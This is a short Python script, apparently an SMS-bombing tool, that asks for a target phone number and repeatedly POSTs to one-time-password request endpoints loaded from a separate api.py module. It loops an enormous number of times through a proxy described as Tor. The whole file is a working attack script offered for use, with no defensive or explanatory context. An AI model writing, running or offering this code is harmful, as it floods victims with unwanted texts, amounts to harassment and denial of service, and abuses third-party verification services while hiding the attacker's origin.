from api import send_otp_requests
import requests
import pyfiglet
import os

# Clear the screen
os.system('clear')

# Tor proxy
proxy = {"https": "127.0.0.1:8000"}

try:
    # Print the text "smscy7fa"
    print(pyfiglet.figlet_format("smscy7fa"))

    # Receive phone number input from the user
    number = input("Enter your phone number (ex: 9123456789)==> ")

    # Get APIs from api.py
    apis = send_otp_requests(number)

    # Loop to send sms times
    for _ in range(999999999999999):
        for url, payload in apis:
            try:
                response = requests.post(url, data=payload, proxies=proxy)

                if response.status_code == 200:
                    print(f"Sent successfully²⁰⁰")

            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
                raise SystemExit

except KeyboardInterrupt:
    print("\nByeBye¡")
